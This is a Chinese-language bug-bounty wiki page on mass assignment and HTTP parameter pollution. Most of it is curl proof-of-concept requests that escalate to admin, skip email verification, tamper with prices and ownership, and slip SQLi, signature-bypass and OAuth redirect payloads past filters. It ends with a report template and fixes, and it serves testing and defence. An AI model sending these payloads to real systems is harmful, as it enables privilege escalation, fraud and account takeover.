---
type: wiki
category: attack
tool: burp,arjun,manual
status: active
last-updated: 2026-04-21
---

# Mass Assignment & HTTP Parameter Pollution（2026 版）

> **用途：** 當 API 把使用者 JSON 直接 `Model.create(req.body)` / `updateUser(params)`，忘了白單 → 加 `isAdmin:true`、`role:admin`、`balance:999999` 直接提權。
> 配合 HPP（同名參數重複送）能過 WAF、過 validate，穩定 P2-P1。

## 0. 原理

### 0.1 Mass Assignment

框架 helper：

| 框架 | 漏洞函式 | 白單機制 |
|------|---------|---------|
| Rails | `User.new(params)` | `strong_parameters` / `permit` |
| Django | `Model.objects.create(**request.POST)` | `ModelForm.fields` |
| Spring | `@RequestBody User user` 無 `@JsonIgnore` | `@JsonIgnore` / DTO |
| Laravel | `User::create($request->all())` | `$fillable` / `$guarded` |
| Express (mongoose) | `new User(req.body).save()` | schema 嚴格 |
| Sequelize | `User.create(req.body)` | `fields: [...]` |

若沒做白單 → 攻擊者能提交任意 field（role/is_admin/email_verified/balance/...）→ 繞 authz。

### 0.2 HTTP Parameter Pollution（HPP）

同一個 param name 出現多次，不同框架取值方式不同：

| Server | `a=1&a=2` 的結果 |
|--------|---------------------|
| PHP | `$_GET['a']` = `2`（最後一個）|
| ASP.NET | `a` = `"1,2"`（用逗號串起）|
| Node.js Express (default) | `req.query.a` = `['1','2']`（array）|
| Java Servlet | `request.getParameter('a')` = `1`；`getParameterValues` = both |
| Ruby Rack | `params[:a]` = `2`（最後）|
| Go net/http | `r.Form['a']` = `['1','2']`; `r.FormValue('a')` = `1` |

→ 一個 proxy/WAF 看到 `role=user`，一個 backend 看到 `role=admin`。

## 1. 偵測

### 1.1 Mass assignment 測試

**Step A**：觀察正常 response 有哪些欄位：

```bash
# 建一個帳號
curl -X POST /api/users -d '{"email":"x@y.com","password":"pw"}'

# Response
{
  "id": 5,
  "email":"x@y.com",
  "role":"user",
  "is_admin":false,
  "email_verified":false,
  "balance":0,
  "created_at":"..."
}
```

**Step B**：在 create / update 時塞 sensitive fields：

```bash
# 方法 1：直接塞
curl -X POST /api/users \
  -d '{"email":"x@y.com","password":"pw","role":"admin","is_admin":true,"email_verified":true,"balance":99999}'

# Response 有 "role":"admin" → vulnerable
```

**Step C**：若 create 有擋，試 update（通常更寬鬆）：

```bash
curl -X PATCH /api/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"role":"admin","is_admin":true}'
```

### 1.2 param discovery（找隱藏欄位）

從 response / source / JS 找：

```bash
# katana + gau + grep
cat urls.txt | while read u; do curl -s "$u" | grep -oE '"[a-z_]+":' | sort -u; done > fields.txt

# 或 arjun 直接打
arjun -u https://target.com/api/users/me -m POST --stable -w /path/to/wordlist
```

**必試 field**：

```
role  roles  is_admin  isAdmin  admin  is_staff  is_superuser
email_verified  verified  activated  enabled
balance  credits  points  coins
password_hash  api_key  token  secret
organization_id  tenant_id  company_id  owner_id  user_id
created_at  updated_at  deleted_at
permissions  scopes  privileges
```

### 1.3 HPP 測試

```bash
# GET
curl "https://target.com/transfer?to=alice&to=attacker&amount=100"

# POST body
curl -X POST /transfer -d "to=alice&to=attacker&amount=100"

# JSON（有些 parser 取最後一個）
curl -X POST /transfer -H "Content-Type: application/json" -d '{"to":"alice","to":"attacker","amount":100}'
```

看 response / balance → 誰收到錢。

## 2. Mass assignment 經典 PoC

### 2.1 自行升 admin

```bash
# Register
curl -X POST https://target.com/api/signup \
  -H "Content-Type: application/json" \
  -d '{"email":"me@x.com","password":"pw","is_admin":true,"role":"admin"}'

# 若 response 含 role=admin → 漏洞確認
# Login 後可存取 admin endpoints
```

### 2.2 email_verified 跳過驗證

```bash
curl -X POST /api/signup \
  -d '{"email":"me@x.com","password":"pw","email_verified":true}'
# 略過 email 驗證 → 可以直接登入
```

### 2.3 organization_id 越權（橫向提權）

```bash
# 加入其他 org
curl -X PATCH /api/users/me \
  -d '{"organization_id":123}'
# 我本來在 org 5，現在被加進 org 123 → 看到其他 company 資料
```

### 2.4 price / balance 操控

```bash
curl -X POST /api/orders \
  -d '{"product_id":1,"quantity":1,"price":0.01}'
# 用 1 分錢買
```

### 2.5 password_hash 直接覆寫

```bash
curl -X PATCH /api/users/me \
  -d '{"password_hash":"$2y$10$YourBcryptHere"}'
# 繞過 password 變更 confirmation
```

### 2.6 owner_id 轉移所有權

```bash
curl -X PATCH /api/resources/42 \
  -d '{"owner_id":MY_ID}'
# 把別人資源變我的
```

### 2.7 user_id spoof

```bash
# 建 comment
curl -X POST /api/comments \
  -d '{"post_id":1,"text":"hi","user_id":ADMIN_ID}'
# 用 admin 名義留言
```

## 3. HPP 進階 PoC

### 3.1 Filter bypass（WAF 看一個，backend 看另一個）

```
# WAF 只看第一個 & backend 取最後一個（PHP）
id=1&id=1%20OR%201=1

# WAF 看到 id=1 → 放行
# backend 取 id=1 OR 1=1 → SQLi 觸發
```

### 3.2 Signature bypass

```
# HMAC sig 算在某些 param 上
?user=alice&amount=100&sig=abc123

# 加第二個 user：
?user=alice&amount=100&sig=abc123&user=attacker

# WAF 簽 sig 時讀第一個 user=alice → 合法
# backend 取最後一個 user=attacker → 錢轉到 attacker
```

### 3.3 OAuth state bypass

```
redirect_uri=https://attacker.com&redirect_uri=https://target.com
# 某些 OAuth server 只 validate 最後一個，但 redirect 第一個
```

### 3.4 Rails `_method` override

```bash
curl -X POST /users/1 -d "_method=DELETE"
# Rails 會當 DELETE 處理 → 繞 POST CSRF check
```

### 3.5 Array / object injection

```bash
# 某些 parser 把 role[]=user&role=admin 當 array
# 權限 check 只看 array[0]=user，但實際 role=admin

curl -X POST /api/users \
  -d 'role=user&role[]=admin'
```

### 3.6 Nested JSON injection

```json
{
  "name": "alice",
  "profile": {
    "bio": "hi",
    "role": "admin"    ← 若 merge 進 user object → admin
  }
}
```

## 4. 框架特定的 gotcha

### 4.1 Rails strong_parameters

```ruby
# 安全
params.require(:user).permit(:email, :password)

# 不安全
User.new(params[:user])
User.update(params[:user])
```

`strong_parameters` 還是可能被 `permit!` 或 `permit(user: {}.to_h.keys)` 誤開。

### 4.2 Django ModelForm

```python
# 安全（明確 fields）
class UserForm(forms.ModelForm):
    class Meta:
        fields = ['email', 'name']

# 危險
class UserForm(forms.ModelForm):
    class Meta:
        fields = '__all__'   # ← 包含 is_staff, is_superuser
```

### 4.3 Spring @RequestBody

```java
// 危險
public User create(@RequestBody User user) { ... }
// User 有 role, isAdmin 欄位 → 全部可設

// 安全：用 DTO
public User create(@RequestBody UserCreateDTO dto) { ... }
// DTO 只有 email, password
```

### 4.4 Laravel $fillable vs $guarded

```php
// 安全
protected $fillable = ['email', 'password'];

// 危險
protected $guarded = [];   // ← 沒黑名單 = 全可寫
protected $guarded = ['id'];   // ← 只擋 id，其他 role/is_admin 放行
```

### 4.5 Mongoose

```js
// 危險
const user = new User(req.body);

// 相對安全（但 mongoose schema 有定義才擋）
new User({email: req.body.email, password: req.body.password})
```

### 4.6 Sequelize

```js
// 危險
User.create(req.body);

// 安全
User.create(req.body, { fields: ['email', 'password'] });
```

## 5. Prototype Pollution 關聯

見 [63-prototype-pollution.md](63-prototype-pollution.md)。

`Object.assign` / `_.merge` 若 deep-merge user input → 可污染 `isAdmin:true` 到 prototype 上 → 等價於 mass assignment + 影響所有 object。

## 6. 完整 PoC：signup → admin takeover

### Step 1: 觀察 response schema

```bash
curl -X POST https://target.com/api/signup \
  -H "Content-Type: application/json" \
  -d '{"email":"a@b.c","password":"pw"}'

{
  "id":42,"email":"a@b.c","role":"user","isAdmin":false,
  "organizationId":null,"emailVerified":false
}
```

### Step 2: 塞 sensitive fields

```bash
curl -X POST https://target.com/api/signup \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@evil.com","password":"pw","role":"admin","isAdmin":true,"emailVerified":true,"organizationId":1}'

{
  "id":43,"email":"admin@evil.com","role":"admin","isAdmin":true,
  "organizationId":1,"emailVerified":true
}
```

### Step 3: 驗證權限

```bash
TOKEN=$(curl ... login | jq -r .token)

curl -H "Authorization: Bearer $TOKEN" https://target.com/api/admin/users
# Response 200 + all users → admin access confirmed
```

### Step 4: 報告

```markdown
## 漏洞概述
/api/signup 直接把 request body 餵進 `User.create()`，沒做 field 白單，
允許攻擊者自行提交 `role:"admin"`, `isAdmin:true`, `emailVerified:true`,
`organizationId:1` 在註冊時直接取得 admin 權限。

## PoC
[兩個 curl：signup with admin fields + /admin/users 驗證]

## Impact
- Unauthenticated admin account creation
- 完整 admin panel access（讀 / 寫 / 刪任意 user）
- 繞過 email 驗證流程

## Severity
P1 / Critical

## 修補
1. User model 加 `fillable` 白單：`['email','password','name']`
2. 移除 `role/isAdmin/organizationId` 從 public API 可設
3. admin fields 只能在 admin endpoint + admin token 下修改
4. 輸入 schema validation（zod/joi/pydantic）嚴格 typing
```

## 7. 防禦 checklist（寫修補建議用）

```
1. 絕不 Model.create(request.body) / Model.update(params)
2. 用 DTO / schema / permit 白單 input fields
3. Sensitive fields（role/isAdmin/email_verified/balance）只能 server-side 改
4. 用不同 endpoint 分離：/users/profile（自身可改）vs /admin/users（admin 改）
5. HPP：選一個明確的取值 convention（Express 設 `query parser: 'simple'`）
6. 任何 balance / price / owner_id 必須 server 重算，不信 client
7. WAF + backend 用同一個 parser（避免 HPP）
8. Rate limit on signup / profile update
```

## 關聯文件

- [63-prototype-pollution.md](63-prototype-pollution.md) — `Object.assign` + mass assignment 鏈
- [70-host-header-crlf.md](70-host-header-crlf.md) — parameter 延伸到 header
- PortSwigger Mass Assignment：https://portswigger.net/web-security/api-testing/server-side-parameter-pollution
- OWASP API Security Top 10 2023 — API6 Unrestricted Resource / API5 BOLA / API3 BOPLA
- HackTricks HPP：https://book.hacktricks.wiki/en/pentesting-web/parameter-pollution.html
